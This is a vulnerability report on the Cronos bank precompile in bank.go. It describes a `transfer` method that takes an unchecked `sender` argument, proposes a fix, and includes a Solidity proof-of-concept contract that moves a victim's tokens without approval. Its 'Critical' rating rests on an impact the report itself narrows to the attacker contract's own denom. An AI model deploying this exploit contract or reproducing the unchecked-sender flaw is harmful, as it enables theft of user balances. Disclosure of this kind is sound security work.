### Title
Unauthenticated `sender` in Bank Precompile `transfer` Allows Any Contract to Steal Users' Native Token Balances - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The bank precompile's `transfer` method accepts an arbitrary `sender` address as a caller-controlled ABI argument and transfers the calling contract's native token denom (`evm/<caller>`) from that address to any recipient — without verifying that the calling contract is authorized to spend the sender's funds. The only guard present checks that the *recipient* is not a blocked module account, but there is no corresponding guard on the *sender*. Any malicious contract can therefore drain any user's balance of that contract's own `evm/<contract>` native token denom without the user's consent.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `transfer` method as follows:

```go
case TransferMethodName:
    sender    := args[0].(common.Address)   // ← fully attacker-controlled
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    if err := bc.checkBlockedAddr(to); err != nil {   // ← only recipient is guarded
        return nil, err
    }
    denom := EVMDenom(contract.Caller())              // evm/<calling_contract>
    // ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `sender` field is taken verbatim from the ABI-encoded call data. The precompile never checks that `contract.Caller() == sender` or that the sender has granted any allowance. The only validation present — `checkBlockedAddr(to)` — guards the *recipient* against being a module account, mirroring the external report's pattern of protecting one party while leaving the other unguarded. [2](#0-1) 

The denom is always `evm/<contract.Caller()>`, so the attacker can only operate on the native token denom that corresponds to their own contract address. However, users legitimately hold such balances: the `mint` method of the same precompile is the standard way to issue `evm/<contract>` native tokens to users, and the `TestBank` integration contract demonstrates exactly this pattern. [3](#0-2) 

### Impact Explanation

**Critical — Unauthorized transfer of precompile-controlled native assets.**

A malicious contract can:
1. Mint `evm/<malicious_contract>` tokens to users (via `bank.mint`) as part of a legitimate-looking token service.
2. At any later time, call `bank.transfer(victim, attacker, balance)` to drain the victim's entire `evm/<malicious_contract>` native balance without any approval or signature from the victim.

This is an unauthorized balance change for precompile-controlled assets, matching the Critical impact tier. The `evm/` denom tokens are first-class Cosmos SDK bank coins and can be used in IBC transfers, governance, and other protocol flows.

### Likelihood Explanation

The entry path is fully unprivileged: any EOA can deploy a contract and call the bank precompile at address `0x0000000000000000000000000000000000000064`. No admin key, governance vote, or validator compromise is required. The attack is a single EVM transaction. [4](#0-3) 

### Recommendation

Add a caller-authorization check in the `TransferMethodName` case, analogous to the `checkBlockedAddr` guard already applied to the recipient:

```go
case TransferMethodName:
    sender    := args[0].(common.Address)
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    // Enforce that only the calling contract may initiate a transfer on behalf of sender
    if contract.Caller() != sender {
        return nil, errors.New("transfer sender must be the calling contract")
    }
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    if err := bc.checkBlockedAddr(to); err != nil {
        return nil, err
    }
    // ... rest unchanged
```

Alternatively, remove the `sender` argument entirely and derive it from `contract.Caller()`, matching the pattern already used for `mint` and `burn` where the affected address is the explicit argument and the caller is implicitly trusted.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerToken {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to a victim (simulating normal token issuance)
    function issueToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: steal them back — no victim approval needed
    function steal(address victim, uint256 amount) external {
        // denom = evm/<address(this)>, sender = victim (arbitrary, not validated)
        bank.transfer(victim, msg.sender, amount);
    }
}
```

After `issueToVictim(alice, 1000)`, calling `steal(alice, 1000)` succeeds and moves all of Alice's `evm/<AttackerToken>` native tokens to the attacker — with no signature or approval from Alice. [5](#0-4)
